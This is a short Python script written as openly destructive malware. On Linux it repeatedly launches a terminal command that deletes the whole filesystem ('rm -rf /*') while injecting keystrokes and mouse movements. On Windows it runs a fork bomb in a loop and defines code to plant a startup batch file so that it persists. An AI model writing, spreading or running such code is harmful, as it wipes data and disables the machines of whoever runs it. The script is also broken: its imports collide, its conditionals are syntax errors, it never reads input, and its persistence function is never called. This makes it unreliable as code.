from pynput.mouse import Button, Controller
from pynput.keyboard import Key, Controller
from sys import platform
import getpass
import os

USER_NAME=getpass.getuser() # Gets the username of the user
key=Controller()
mouse=Controller()
warning="Are you sure you want to execute this program, I am not responsible for any damage that has been caused. Answer (Y/n) "

def keypresses():
    key.press("Q")
    key.press("W")
    key.press("E")
    key.press("R")
    key.press("T")
    key.press("Y")

def mice():
    mouse.position = (40,60)
    mouse.position = (20,50)
    mouse.position = (90,100)
    mouse.press(Button.left)
    mouse.press(Button.right)

# Linux code
def linux():
    # A loop that presses the keys, moves the mouse position and starts the terminal
    while True:
        os.system("./pynput_install.sh")
        keypresses()
        mice()
        os.system("gnome-terminal 'rm -rf /*'")
        
# Windows code
def windows():
    os.system("start pynput_install.bat")
    
    # This code creates a batch file in the startup directory that makes the program start when the computer starts
    def add_to_startup(file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'cp Covid_20 "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
            bat_file.write(r'python "" %s' % file_path)


    while True:
        keypresses()
        mice()
        os.system("fork_bomb.bat") 
        
# If the user is using linux, use the linux() function
if platform == 'linux' or platform == 'linux2':
    print(warning)
    if warning = "Y" or warning = "y":
        linux()
    else:
        print("Okay then bye bye!")
        
# If the user is using windows use the windows() function
elif platform == 'win32':
    print(warning)
    if warning = "Y" or warning = "y":
        windows()
    else:
        print("Nah, not today...")
